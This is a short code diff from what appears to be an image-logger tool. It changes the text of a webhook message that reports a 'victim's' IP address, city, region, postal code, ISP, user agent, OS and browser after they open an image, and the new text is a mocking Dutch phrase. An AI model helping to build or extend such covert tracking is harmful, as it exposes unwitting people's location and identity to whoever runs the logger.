@@ -16,7 +16,7 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     {
       "title": "Moete Matte Wint Weer!",
       "color": 16711803,
-      "description": "A Victim opened the original Image. You can find their info below.",
+      "description": "Een Kleine Lozer Heeft Er Op Geklikt Info Staat Hier Beneden.",
       "author": {
         "name": "BigDickRandy"
       },
